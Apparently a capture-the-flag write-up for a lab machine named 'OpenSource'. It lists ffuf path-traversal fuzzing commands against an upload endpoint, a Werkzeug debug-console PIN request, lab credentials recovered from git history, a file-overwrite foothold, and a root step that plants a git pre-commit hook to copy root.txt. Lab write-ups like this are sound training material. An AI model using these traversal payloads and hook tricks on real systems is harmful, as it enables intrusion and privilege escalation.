OpenSource

# Enumeration

## Web
### GET /uploads/<FILE>
LFI in GET /uploads/<LIF> [logs/gobuster/fuff_lfi]
Found files [loot/lfi]

$ cat /usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt | sed "s/^\///g" | ffuf -fc 404,500,308 -mc all -c -w - -u ${URL}/uploads/..%2F..%2F..%2F%2F..%2F..%2FFUZZ | tee logs/gobuster/ffuf_lfi_etc
$ cat /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt | sed "s/^\///g" | ffuf -fc 404,500,308 -mc all -c -w - -u ${URL}/uploads/..%2F..%2F..%2F%2F..%2F..%2FFUZZ | tee logs/gobuster/ffuf_lfi_grace

### GET /upcloud
### POST /upcloud

### GET /console
PIN code required. Python console
#### GET /console?__debugger__=yes&cmd=pinauth&pin=0000&s=UGgHPQaV9yC6zWjZ5kdc

### GET /download
Downloads source code

## .git [loot/source]
```bash
$ dev branch
$ git show HEAD~2
-{
-  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
-  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
-  "http.proxyStrictSSL": false
-}
```
User found: dev01

# Foothold
upload [exploit/views.py] to POST /uploads with filename /app/app/views.py. See [exploit/foothold.py]

Docker container

Wegzeug pin: 467-691-774

$ hostname
8eb93908614f

/usr/local/lib/python3.10/site-packages/

## Port 3000 available from container
Gitea Version: 1.16.6

wget 172.17.0.1:3000/user/login --post-data="user_name=dev01&password=Soulless_Developer#2022" -O -

# User
Found SSH key in git under 'backup'

```bash
dev01@opensource:/var/opt/gitlab$ cat public_attributes.json 
{"gitlab":{"gitlab-rails":{"db_database":"gitlabhq_production"}},"postgresql":{"dir":"/var/opt/gitlab/postgresql","unix_socket_directory":"/var/opt/gitlab/postgresql","port":5432}}

dev01@opensource:$ dpkg -l | grep gitlab
rc  gitlab-ce                              14.8.4-ce.0                                     amd64        GitLab Community Edition (including NGINX, Postgres, Redis)

```
# Root
cat << EOF > .git/hooks/pre-commit
#!/bin/sh

cp /root/root.txt /home/dev01/root.txt
chmod 777 /home/dev01/root.txt
EOF
